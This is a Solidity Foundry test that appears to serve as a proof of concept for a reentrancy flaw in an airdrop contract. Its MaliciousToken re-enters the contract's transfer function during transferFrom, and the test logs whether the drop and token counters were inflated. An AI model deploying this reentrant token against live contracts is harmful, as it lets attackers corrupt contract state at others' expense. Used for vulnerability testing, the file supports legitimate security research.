// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xe894d54dca59cb53fe9cbc5155093605c7068220.sol";

contract MaliciousToken {
    airDrop public airdrop;
    address public from;
    uint public v;
    uint public decimals;
    address public reentrantRecipient;
    bool public reentered;

    constructor(
        airDrop _airdrop, 
        address _from, 
        uint _v, 
        uint _decimals, 
        address _recippent
    ) {
        airdrop = _airdrop;
        from = _from;
        v = _v;
        decimals = _decimals;
        reentrantRecipient = _recippent;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        if (!reentered) {
            reentered = true;
            address[] memory tos = new address[](1);
            tos[0] = reentrantRecipient;
            airdrop.transfer(from, address(this), tos, v, decimals);
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    airDrop public airdrop;
    MaliciousToken public maliciousToken;
    
    address from = address(0x1);
    uint v = 100;
    uint decimals = 18;
    address recipient1 = address(0x2);
    address recipient2 = address(0x3);

    event DropExecuted(address indexed from, address indexed token, uint256 numberOfRecipients, uint256 amountPerRecipient);

    function setUp() public {
        airdrop = new airDrop();
        maliciousToken = new MaliciousToken(
            airdrop,
            address(this),
            v,
            decimals,
            recipient2
        );
    }

    function testReentrancy() public {
        // Pre-trigger state recording
        console.log("--- Pre-trigger State ---");
        uint preTotalDrops = airdrop.totalDrops();
        uint preTotalTokensDistributed = airdrop.totalTokensDistributed();
        uint preUserDropCount = airdrop.userDropCount(address(this));
        console.log("Initial totalDrops:", preTotalDrops);
        console.log("Initial totalTokensDistributed:", preTotalTokensDistributed);
        console.log("Initial userDropCount:", preUserDropCount);

        // Trigger reentrant transfer
        console.log("--- Triggering Reentrancy ---");
        address[] memory tos = new address[](1);
        tos[0] = recipient1;
        vm.recordLogs();
        airdrop.transfer(address(this), address(maliciousToken), tos, v, decimals);

        // Post-trigger state recording
        console.log("--- Post-trigger State ---");
        uint postTotalDrops = airdrop.totalDrops();
        uint postTotalTokensDistributed = airdrop.totalTokensDistributed();
        uint postUserDropCount = airdrop.userDropCount(address(this));
        console.log("Final totalDrops:", postTotalDrops);
        console.log("Final totalTokensDistributed:", postTotalTokensDistributed);
        console.log("Final userDropCount:", postUserDropCount);

        // State difference calculation
        uint dropsDiff = postTotalDrops - preTotalDrops;
        uint tokensDiff = postTotalTokensDistributed - preTotalTokensDistributed;
        uint userDropsDiff = postUserDropCount - preUserDropCount;
        console.log("TotalDrops Difference (expected 2):", dropsDiff);
        console.log("TotalTokens Difference (expected 200):", tokensDiff);
        console.log("UserDropCount Difference (expected 2):", userDropsDiff);

        // Vulnerability condition check
        bool vulnerabilityExists = 
            dropsDiff == 2 && 
            tokensDiff == 200 && 
            userDropsDiff == 2;

        // Vulnerability verdict
        if (vulnerabilityExists) {
            console.log("Vulnerability Exists: Reentrancy attack successfully manipulated state variables");
        } else {
            console.log("Vulnerability not Exist: State differences do not indicate successful reentrancy");
        }
    }
}